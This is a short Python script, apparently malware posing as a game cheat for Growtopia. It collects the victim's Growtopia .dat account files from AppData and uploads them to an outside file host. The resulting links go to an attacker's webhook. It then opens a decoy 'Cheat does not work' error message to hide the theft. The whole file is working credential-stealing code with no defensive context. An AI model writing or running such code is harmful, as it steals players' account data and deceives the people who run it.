# author (batmobiledriver)

import os
from pathlib import Path
import requests              # dowland requests module
import json
import glob

webhook = "webhook here" # your webhook

home = Path.home()
path = str(home)

ff = open('msg.txt', 'w')
ff.write('Cheat does not work.exe error found, open again error code: 7777')# You can change these as you wish.
ff.close()

def steal():
	for i in glob.glob(f'{path}\AppData\Local\Growtopia\*.dat'):
		if '.' in i:
			data = {'file': (open(i, "rb"))}
			r = requests.post('https://https://ghostbin.com', files=data)
			resp = json.loads(r.text)
		else:
			pass

		if resp['status']:
			urllong = resp['data']['file']['url']['full']
			urlshort = resp['data']['file']['url']['short']
			payload = {'content': f"**savedat auth by zkexbatmobiledriver**\n**URL Long** : `{urllong}`\n**URL Short** : `{urlshort}`"}
			requests.post(webhook, json=payload)
		else:
			message = resp['error']['message']
			errtype = resp['error']['type']
			print(f'[ERROR] {message}\n{errtype}')

if __name__ == "__main__":
	steal()
	os.system('start msg.txt')
